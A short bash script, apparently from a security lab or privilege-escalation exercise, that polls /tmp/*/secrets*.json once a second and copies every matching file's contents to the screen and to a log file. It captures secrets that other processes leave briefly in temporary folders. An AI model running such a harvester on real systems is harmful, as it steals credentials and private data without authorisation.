#!/usr/bin/env bash

log_file="/var/log/monitor_secrets.log"

echo "[+] Monitoring /tmp/*/secrets*.json..." | tee -a "$log_file"

while true; do
    for file in /tmp/*/secrets*.json; do
        if [ -f "$file" ]; then
            echo "[+] Found: $file" | tee -a "$log_file"
            cat "$file" | tee -a "$log_file"
        fi
    done
    sleep 1  # Evite une boucle infinie trop rapide
done
